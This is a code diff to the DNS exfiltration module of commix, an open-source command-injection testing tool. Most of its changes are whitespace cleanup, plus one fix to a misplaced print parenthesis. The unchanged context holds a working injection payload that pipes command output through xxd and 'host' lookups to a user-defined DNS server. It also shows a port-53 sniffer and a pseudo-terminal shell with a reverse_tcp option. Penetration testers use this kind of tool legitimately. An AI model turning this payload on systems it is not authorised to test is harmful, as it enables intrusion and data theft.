@@ -9,7 +9,7 @@ This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
- 
+
 For more see the file 'readme/COPYING' for copying permission.
 """
 
@@ -62,7 +62,7 @@ pass
 
 
 """
-The DNS exfiltration technique: 
+The DNS exfiltration technique:
 exfiltrate data using a user-defined DNS server [1].
 
 [1] http://www.contextis.com/resources/blog/data-exfiltration-blind-os-command-injection/
@@ -82,11 +82,11 @@ def snif(dns_server):
   print(settings.print_bold_info_msg(info_msg))
   while True:
     sniff(filter="port 53", prn=querysniff, store = 0)
- 
+
 def cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter):
   # DNS exfiltration payload.
   payload = ("; " + cmd + " | xxd -p -c 16 | while read line; do host $line.xxx " + dns_server + "; done")
-  
+
   # Check if defined "--verbose" option.
   if settings.VERBOSITY_LEVEL >= 1:
     sys.stdout.write("\n" + settings.print_payload(payload))
@@ -99,7 +99,7 @@ def cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter):
     values =  {vuln_parameter:payload}
     data = _urllib.parse.urlencode(values)
     request = _urllib.request.Request(url=url, data=data)
-    
+
   sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
   response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
   time.sleep(2)
@@ -120,18 +120,18 @@ def input_cmd(dns_server, http_request_method, url, vuln_parameter, technique):
     warn_msg += "by this module because of the structure of the exfiltrated data. "
     warn_msg += "Please try using any unix-like commands manually."
     print(settings.print_warning_msg(warn_msg))
-  
+
   # Pseudo-Terminal shell
   go_back = False
   go_back_again = False
   while True:
     if go_back == True:
       break
-    if not menu.options.batch:  
+    if not menu.options.batch:
       question_msg = "Do you want a Pseudo-Terminal shell? [Y/n] > "
       gotshell = _input(settings.print_question_msg(question_msg))
     else:
-      gotshell = ""  
+      gotshell = ""
     if len(gotshell) == 0:
        gotshell= "Y"
     if gotshell in settings.CHOICE_YES:
@@ -152,12 +152,12 @@ def input_cmd(dns_server, http_request_method, url, vuln_parameter, technique):
           cmd = _input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
           cmd = checks.escaped_cmd(cmd)
           if cmd.lower() in settings.SHELL_OPTIONS:
-            if cmd.lower() == "quit" or cmd.lower() == "back":       
-              print("")             
+            if cmd.lower() == "quit" or cmd.lower() == "back":
+              print("")
               os._exit(0)
-            elif cmd.lower() == "?": 
+            elif cmd.lower() == "?":
               menu.os_shell_options()
-            elif cmd.lower() == "os_shell": 
+            elif cmd.lower() == "os_shell":
               warn_msg = "You are already into the '" + cmd.lower() + "' mode."
               print(settings.print_warning_msg(warn_msg))+ "\n"
             elif cmd.lower() == "reverse_tcp":
@@ -170,7 +170,7 @@ def input_cmd(dns_server, http_request_method, url, vuln_parameter, technique):
         except KeyboardInterrupt:
           print("")
           os._exit(0)
-          
+
         except:
           print("")
           os._exit(0)
@@ -220,7 +220,7 @@ def dns_exfiltration_handler(url, http_request_method):
     vuln_parameter = parameters.vuln_GET_param(url)
     request = _urllib.request.Request(url)
     headers.do_check(request)
-    
+
   else:
     parameter = menu.options.data
     parameter = _urllib.parse.unquote(parameter)
@@ -228,17 +228,17 @@ def dns_exfiltration_handler(url, http_request_method):
     request = _urllib.request.Request(url, parameter)
     headers.do_check(request)
     vuln_parameter = parameters.vuln_POST_param(parameter, url)
-  
+
   # Check if defined any HTTP Proxy.
   if menu.options.proxy:
     try:
       response = proxy.use_proxy(request)
     except _urllib.error.HTTPError as err_msg:
       if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
-        response = False  
+        response = False
       elif settings.IGNORE_ERR_MSG == False:
         err = str(err_msg) + "."
-        print("\n") + settings.print_critical_msg(err)
+        print("\n" + settings.print_critical_msg(err))
         continue_tests = checks.continue_tests(err_msg)
         if continue_tests == True:
           settings.IGNORE_ERR_MSG = True
@@ -251,7 +251,7 @@ def dns_exfiltration_handler(url, http_request_method):
       response = tor.use_tor(request)
     except _urllib.error.HTTPError as err_msg:
       if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
-        response = False  
+        response = False
       elif settings.IGNORE_ERR_MSG == False:
         err = str(err_msg) + "."
         print("\n") + settings.print_critical_msg(err)
@@ -266,7 +266,7 @@ def dns_exfiltration_handler(url, http_request_method):
       response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
     except _urllib.error.HTTPError as err_msg:
       if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
-        response = False  
+        response = False
       elif settings.IGNORE_ERR_MSG == False:
         err = str(err_msg) + "."
         print("\n") + settings.print_critical_msg(err)
